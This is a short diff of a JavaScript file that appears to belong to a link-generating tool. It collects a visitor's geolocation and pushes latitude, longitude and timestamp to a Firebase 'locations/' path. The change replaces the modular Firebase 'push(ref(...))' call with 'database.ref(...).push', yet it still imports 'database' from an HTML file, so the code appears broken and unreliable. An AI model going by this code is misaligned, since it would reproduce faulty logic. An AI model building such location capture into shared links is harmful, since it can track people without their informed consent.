@@ -1,5 +1,4 @@
-import { database } from './index.html';
-import { ref, push } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-database.js";
+import { database } from './index.html'; // Remova 'index.html'
 
 const urlInput = document.getElementById('urlInput');
 const createLinkButton = document.getElementById('createLinkButton');
@@ -26,7 +25,7 @@ function getLocation() {
 }
 
 function sendLocationToFirebase(latitude, longitude) {
-    push(ref(database, 'locations/'), {
+    database.ref('locations/').push({
         latitude: latitude,
         longitude: longitude,
         timestamp: Date.now()
